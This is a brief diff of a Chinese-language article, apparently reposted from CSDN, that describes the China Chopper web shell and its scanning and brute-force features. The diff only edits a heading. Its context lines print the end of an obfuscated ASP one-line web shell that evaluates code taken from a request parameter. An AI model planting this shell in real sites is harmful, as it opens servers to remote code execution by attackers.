@@ -127,7 +127,7 @@ requestms.ExecuteStatement(“ev”&”al(request(“”1″”))”)%>
  
 轉載請註明出處：https://blog.csdn.net/l1028386804/article/details/84206143
 ```
-# 黑客工具之中國菜刀（Chopper）
+# 黑客工具 中國菜刀（Chopper）
 ```
 中國菜刀包含了「安全掃描」功能，攻擊者能夠使用爬蟲或暴力破解來攻擊目標站點
 
